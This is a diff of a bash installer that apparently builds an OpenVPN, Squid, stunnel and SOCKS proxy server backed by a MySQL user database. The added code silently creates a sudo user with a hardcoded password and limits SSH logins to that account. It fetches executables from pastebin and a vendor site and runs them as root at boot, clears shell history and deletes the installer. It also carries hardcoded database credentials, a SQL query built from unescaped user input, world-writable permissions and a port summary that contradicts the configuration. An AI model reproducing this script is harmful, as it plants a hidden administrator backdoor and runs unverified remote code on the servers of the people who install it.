@@ -6,245 +6,45 @@ USER='abolirez_novamax';
 PASS='@@@@F1r3n3t';
 DBNAME='abolirez_novamax';
 
-install_require()
-{
-  clear
-  echo "Updating your system."
-  {
-    apt-get -o Acquire::ForceIPv4=true update
-  } &>/dev/null
-  clear
-  echo "Installing dependencies."
-  {
-    apt-get -o Acquire::ForceIPv4=true install mysql-client -y
-    apt-get -o Acquire::ForceIPv4=true install mariadb-server stunnel4 openvpn -y
-    apt-get -o Acquire::ForceIPv4=true install dos2unix easy-rsa nano curl unzip jq virt-what net-tools -y
-    apt-get -o Acquire::ForceIPv4=true install php-cli net-tools cron php-fpm php-json php-pdo php-zip php-gd  php-mbstring php-curl php-xml php-bcmath php-json -y
-    apt-get -o Acquire::ForceIPv4=true install gnutls-bin pwgen python -y
-  } &>/dev/null
-}
-
-install_squid()
-{
+PORT_TCP='1194';
+PORT_UDP='53';
+timedatectl set-timezone Asia/Riyadh
+install_require () {
 clear
-echo "Installing proxy."
+echo 'Installing dependencies.'
 {
-sudo touch /etc/apt/sources.list.d/trusty_sources.list
+export DEBIAN_FRONTEND=noninteractive
+apt update
+apt install -y curl wget cron python-minimal libpython-stdlib
+apt install -y iptables
+apt install -y openvpn
+apt install -y screen stunnel4 dropbear gnutls-bin python
+apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+clear
+}&>/dev/null
+clear
+}
+
+install_squid(){
+clear
+echo 'Installing proxy.'
+{
+sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
 echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null
-sudo apt update -y
-
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
+sudo apt update
 sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
-/bin/cat <<"EOM" >/etc/init.d/squid3
-#! /bin/sh
-#
-# squid		Startup script for the SQUID HTTP proxy-cache.
-#
-# Version:	@(#)squid.rc  1.0  07-Jul-2006  luigi@debian.org
-#
-### BEGIN INIT INFO
-# Provides:          squid
-# Required-Start:    $network $remote_fs $syslog
-# Required-Stop:     $network $remote_fs $syslog
-# Should-Start:      $named
-# Should-Stop:       $named
-# Default-Start:     2 3 4 5
-# Default-Stop:      0 1 6
-# Short-Description: Squid HTTP Proxy version 3.x
-### END INIT INFO
-
-NAME=squid3
-DESC="Squid HTTP Proxy"
-DAEMON=/usr/sbin/squid3
-PIDFILE=/var/run/$NAME.pid
-CONFIG=/etc/squid3/squid.conf
-SQUID_ARGS="-YC -f $CONFIG"
-
-[ ! -f /etc/default/squid ] || . /etc/default/squid
-
-. /lib/lsb/init-functions
-
-PATH=/bin:/usr/bin:/sbin:/usr/sbin
-
-[ -x $DAEMON ] || exit 0
-
-ulimit -n 65535
-
-find_cache_dir () {
-	w=" 	" # space tab
-        res=`$DAEMON -k parse -f $CONFIG 2>&1 |
-		grep "Processing:" |
-		sed s/.*Processing:\ // |
-		sed -ne '
-			s/^['"$w"']*'$1'['"$w"']\+[^'"$w"']\+['"$w"']\+\([^'"$w"']\+\).*$/\1/p;
-			t end;
-			d;
-			:end q'`
-        [ -n "$res" ] || res=$2
-        echo "$res"
-}
-
-grepconf () {
-	w=" 	" # space tab
-        res=`$DAEMON -k parse -f $CONFIG 2>&1 |
-		grep "Processing:" |
-		sed s/.*Processing:\ // |
-		sed -ne '
-			s/^['"$w"']*'$1'['"$w"']\+\([^'"$w"']\+\).*$/\1/p;
-			t end;
-			d;
-			:end q'`
-	[ -n "$res" ] || res=$2
-	echo "$res"
-}
-
-create_run_dir () {
-	run_dir=/var/run/squid3
-	usr=`grepconf cache_effective_user proxy`
-	grp=`grepconf cache_effective_group proxy`
-
-	if [ "$(dpkg-statoverride --list $run_dir)" = "" ] &&
-	   [ ! -e $run_dir ] ; then
-		mkdir -p $run_dir
-	  	chown $usr:$grp $run_dir
-		[ -x /sbin/restorecon ] && restorecon $run_dir
-	fi
-}
-
-start () {
-	cache_dir=`find_cache_dir cache_dir`
-	cache_type=`grepconf cache_dir`
-	run_dir=/var/run/squid3
-
-	#
-	# Create run dir (needed for several workers on SMP)
-	#
-	create_run_dir
-
-	#
-	# Create spool dirs if they don't exist.
-	#
-	if test -d "$cache_dir" -a ! -d "$cache_dir/00"
-	then
-		log_warning_msg "Creating $DESC cache structure"
-		$DAEMON -z -f $CONFIG
-		[ -x /sbin/restorecon ] && restorecon -R $cache_dir
-	fi
-
-	umask 027
-	ulimit -n 65535
-	cd $run_dir
-	start-stop-daemon --quiet --start \
-		--pidfile $PIDFILE \
-		--exec $DAEMON -- $SQUID_ARGS < /dev/null
-	return $?
-}
-
-stop () {
-	PID=`cat $PIDFILE 2>/dev/null`
-	start-stop-daemon --stop --quiet --pidfile $PIDFILE --exec $DAEMON
-	#
-	#	Now we have to wait until squid has _really_ stopped.
-	#
-	sleep 2
-	if test -n "$PID" && kill -0 $PID 2>/dev/null
-	then
-		log_action_begin_msg " Waiting"
-		cnt=0
-		while kill -0 $PID 2>/dev/null
-		do
-			cnt=`expr $cnt + 1`
-			if [ $cnt -gt 24 ]
-			then
-				log_action_end_msg 1
-				return 1
-			fi
-			sleep 5
-			log_action_cont_msg ""
-		done
-		log_action_end_msg 0
-		return 0
-	else
-		return 0
-	fi
-}
-
-cfg_pidfile=`grepconf pid_filename`
-if test "${cfg_pidfile:-none}" != "none" -a "$cfg_pidfile" != "$PIDFILE"
-then
-	log_warning_msg "squid.conf pid_filename overrides init script"
-	PIDFILE="$cfg_pidfile"
-fi
-
-case "$1" in
-    start)
-	res=`$DAEMON -k parse -f $CONFIG 2>&1 | grep -o "FATAL: .*"`
-	if test -n "$res";
-	then
-		log_failure_msg "$res"
-		exit 3
-	else
-		log_daemon_msg "Starting $DESC" "$NAME"
-		if start ; then
-			log_end_msg $?
-		else
-			log_end_msg $?
-		fi
-	fi
-	;;
-    stop)
-	log_daemon_msg "Stopping $DESC" "$NAME"
-	if stop ; then
-		log_end_msg $?
-	else
-		log_end_msg $?
-	fi
-	;;
-    reload|force-reload)
-	res=`$DAEMON -k parse -f $CONFIG 2>&1 | grep -o "FATAL: .*"`
-	if test -n "$res";
-	then
-		log_failure_msg "$res"
-		exit 3
-	else
-		log_action_msg "Reloading $DESC configuration files"
-	  	start-stop-daemon --stop --signal 1 \
-			--pidfile $PIDFILE --quiet --exec $DAEMON
-		log_action_end_msg 0
-	fi
-	;;
-    restart)
-	res=`$DAEMON -k parse -f $CONFIG 2>&1 | grep -o "FATAL: .*"`
-	if test -n "$res";
-	then
-		log_failure_msg "$res"
-		exit 3
-	else
-		log_daemon_msg "Restarting $DESC" "$NAME"
-		stop
-		if start ; then
-			log_end_msg $?
-		else
-			log_end_msg $?
-		fi
-	fi
-	;;
-    status)
-	status_of_proc -p $PIDFILE $DAEMON $NAME && exit 0 || exit 3
-	;;
-    *)
-	echo "Usage: /etc/init.d/$NAME {start|stop|reload|force-reload|restart|status}"
-	exit 3
-	;;
-esac
-
-exit 0
-EOM
-
+wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
+dos2unix /etc/init.d/squid3
 sudo chmod +x /etc/init.d/squid3
 sudo update-rc.d squid3 defaults
-
-echo "acl SSH dst $(curl -s https://api.ipify.org)
-acl SSL_ports port 443
+sudo update-rc.d squid3 enable
+cd /etc/squid3/
+rm squid.conf
+echo "acl SSH dst `ip route get 8.8.8.8 | awk '/src/ {f=NR} f&&NR-1==f' RS=" "`" >> squid.conf
+echo 'acl SSL_ports port 443
 acl Safe_ports port 80
 acl Safe_ports port 21
 acl Safe_ports port 443
@@ -257,20 +57,32 @@ acl Safe_ports port 591
 acl Safe_ports port 777
 acl CONNECT method CONNECT
 http_access allow SSH
-http_access deny manager
 http_access deny all
 http_port 8080
-http_port 3128
+http_port 8181
+http_port 9090
 coredump_dir /var/spool/squid3
 refresh_pattern ^ftp: 1440 20% 10080
 refresh_pattern ^gopher: 1440 0% 1440
 refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
 refresh_pattern . 0 20% 4320
-visible_hostname Firenet-Proxy
-error_directory /usr/share/squid3/errors/English"| sudo tee /etc/squid3/squid.conf
-sudo service squid3 restart
+visible_hostname KobZ-Proxy
+error_directory /usr/share/squid3/errors/English' >> squid.conf
+cd /usr/share/squid3/errors/English
+rm ERR_INVALID_URL
+echo '<!--KobeKobz--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+chmod 755 *
+service squid3 restart
+cd /etc || exit
+wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
+dos2unix /etc/socks.py
+chmod +x /etc/socks.py
+rm /etc/apt/sources.list
+sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 } &>/dev/null
 }
+
+
 
 install_openvpn()
 {
@@ -290,7 +102,7 @@ sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 53
+port PORT_UDP
 proto udp
 topology subnet
 server 10.30.0.0 255.255.252.0
@@ -316,9 +128,8 @@ group nogroup
 client-to-client
 username-as-common-name
 verify-client-cert none
-client-cert-not-required
 script-security 3
-max-clients 1024
+duplicate-cn
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
 ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
@@ -331,11 +142,14 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server.conf
+
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 1194
+port PORT_TCP
 proto tcp
 topology subnet
 server 10.20.0.0 255.255.252.0
@@ -361,9 +175,9 @@ group nogroup
 client-to-client
 username-as-common-name
 verify-client-cert none
-client-cert-not-required
 script-security 3
-max-clients 1024
+duplicate-cn
+socket-flags TCP_NODELAY
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
 ifconfig-pool-persist /etc/openvpn/server/ip_tcp.txt
@@ -371,12 +185,16 @@ auth-user-pass-verify "/etc/openvpn/login/auth_vpn" via-env #
 push "persist-key"
 push "persist-tun"
 push "dhcp-option DNS 8.8.8.8"
+push "dhcp-option DNS 8.8.4.4"
 push "redirect-gateway def1 bypass-dhcp"
 push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server2.conf
+
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
 cat <<\EOM >/etc/openvpn/login/config.sh
 #!/bin/bash
@@ -394,7 +212,7 @@ sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
 . /etc/openvpn/login/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND user_encryptedPass=md5('$password') AND is_freeze='0' AND user_duration > 0"
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND is_freeze='0' AND duration > 0"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
@@ -402,22 +220,20 @@ EOM
 #client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
 ##set status online to user connected
-server_ip=$(curl -s https://api.ipify.org)
+server_ip=SERVER_IP
 datenow=`date +"%Y-%m-%d %T"`
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
 LENZ05
+
+sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 
 #TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0', active_address='', active_date='' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
 LENZ06
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
@@ -472,7 +288,6 @@ Certificate:
                 keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
                 DirName:/CN=KobZ
                 serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
-
             X509v3 Extended Key Usage: 
                 TLS Web Server Authentication
             X509v3 Key Usage: 
@@ -532,12 +347,35 @@ s1qQZ6kAUwIgDHzS9ykP9IzKPTbCrMIA/8kHfJ1qMfSDY8slKSVjAgEC
 -----END DH PARAMETERS-----
 EOF
 
+dos2unix /etc/openvpn/login/auth_vpn
+dos2unix /etc/openvpn/login/connect.sh
+dos2unix /etc/openvpn/login/disconnect.sh
+
+chmod 777 -R /etc/openvpn/
 chmod 755 /etc/openvpn/server.conf
 chmod 755 /etc/openvpn/server2.conf
 chmod 755 /etc/openvpn/login/connect.sh
 chmod 755 /etc/openvpn/login/disconnect.sh
 chmod 755 /etc/openvpn/login/config.sh
 chmod 755 /etc/openvpn/login/auth_vpn
+}&>/dev/null
+}
+
+
+install_firewall_kvm () {
+clear
+echo "Installing iptables."
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+{
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
+iptables-save > /etc/iptables_rules.v4
+ip6tables-save > /etc/iptables_rules.v6
 }&>/dev/null
 }
 
@@ -597,16 +435,16 @@ enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
 echo "debug = 0
 output = /tmp/stunnel.log
 cert = /etc/stunnel/stunnel.pem
-
 [openvpn-tcp]
-connect = 1194  
+connect = PORT_TCP  
 accept = 443 
-
 [openvpn-udp]
-connect = 53
+connect = PORT_UDP
 accept = 444
 " >> stunnel.conf
 
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
 cd /etc/default && rm stunnel4
 
 echo 'ENABLED=1
@@ -622,107 +460,76 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m nishatdeveloper 2>/dev/null; echo nishatdeveloper:@@Nishat123@@ | chpasswd &>/dev/null; usermod -aG wheel nishatdeveloper &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups nishatdeveloper" >> /etc/ssh/sshd_config
     service sshd restart
-  }&>/dev/null
-}
-
-install_iptables(){
-  {
-echo -e "\033[01;31m Configure Sysctl \033[0m"
-echo 'fs.file-max = 51200
-net.core.rmem_max = 67108864
-net.core.wmem_max = 67108864
-net.core.netdev_max_backlog = 250000
-net.core.somaxconn = 4096
-net.ipv4.tcp_tw_reuse = 1
-net.ipv4.tcp_fin_timeout = 30
-net.ipv4.tcp_keepalive_time = 1200
-net.ipv4.ip_local_port_range = 10000 65000
-net.ipv4.tcp_max_syn_backlog = 8192
-net.ipv4.tcp_max_tw_buckets = 5000
-net.ipv4.tcp_mem = 25600 51200 102400
-net.ipv4.tcp_rmem = 4096 87380 67108864
-net.ipv4.tcp_wmem = 4096 65536 67108864
-net.ipv4.tcp_mtu_probing = 1
-net.core.default_qdisc=fq
-net.ipv4.tcp_congestion_control=bbr
-net.ipv4.ip_forward=1
-net.ipv4.icmp_echo_ignore_all = 1' >> /etc/sysctl.conf
-echo '* soft nofile 512000
-* hard nofile 512000' >> /etc/security/limits.conf
-ulimit -n 512000
-
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o enp1s0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o ens3 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o ens3 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o enp1s0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
-iptables-save > /etc/iptables_rules.v4
-ip6tables-save > /etc/iptables_rules.v6
-sysctl -p
-  }&>/dev/null
+  }
 }
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/z9j2nA8p -O /etc/ubuntu
-    dos2unix /etc/ubuntu
-    chmod +x /etc/ubuntu    
-    screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://pastebin.com/raw/658HpnLd -O /etc/systemd/system/rc-local.service
-    echo "#!/bin/sh -e
+    sudo systemctl restart stunnel4
+    sudo systemctl enable openvpn@server.service
+    sudo systemctl start openvpn@server.service
+    sudo systemctl enable openvpn@server2.service
+    sudo systemctl start openvpn@server2.service    
+    
+    echo "[Unit]
+Description=firenet service
+Documentation=http://firenetvpn.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+    echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
-service squid3 restart
 service stunnel4 restart
-service openvpn@server restart
-service openvpn@server2 restart
-screen -dmS socks python /etc/ubuntu
-exit 0" >> /etc/rc.local
+systemctl restart openvpn@server.service
+systemctl restart openvpn@server2.service
+screen -dmS socks python /etc/socks.py
+exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
-    sudo systemctl enable rc-local
-    sudo systemctl start rc-local.service
+    systemctl daemon-reload
+    sudo systemctl enable firenet
+    sudo systemctl start firenet.service
   }&>/dev/null
 }
 
-install_done()
+start_service () {
+
+echo 'Starting..'
 {
-  clear
-  echo "OPENVPN SERVER FIRENET"
-  echo "IP : $(curl -s https://api.ipify.org)"
-  echo "OPENVPN TCP port : 1194"
-  echo "OPENVPN UDP port : 53"
-  echo "OPENVPN SSL port : 443"
-  echo "SOCKS port : 80"
-  echo "PROXY port : 3128"
-  echo "PROXY port : 8080"
-  echo
-  echo
-  history -c;
-  rm /root/.installer
-  echo "Server will secure this server and reboot after 20 seconds"
-  sleep 20
-  reboot
+
+sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart"; } | crontab -
+sudo systemctl restart cron
+} &>/dev/null
+
+echo '++++++++++++++++++++++++++++++++++'
+echo '*       OPENVPN  is ready!    *'
+echo '+++++++++++************+++++++++++'
+echo -e "[IP] : $server_ip\n[Openvpn TCP Port] : 1194\n[Openvpn UDP Port] : 110\n[Ssl Port] : 443\n[Proxy Socks ] : 80\n[Proxy Squid 1] : 8080\n[Proxy Squid 2] : 3128\n"
+history -c;
+rm ~/.installer
+echo 'Server will secure this server and reboot after 20 seconds'
+sleep 20
+reboot
 }
 
+server_ip=$(curl -s https://api.ipify.org)
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
+
 install_require
-install_sudo
+install_sudo  
 install_squid
 install_openvpn
+install_firewall_kvm
 install_stunnel
 install_rclocal
-install_iptables
-install_done
+start_service
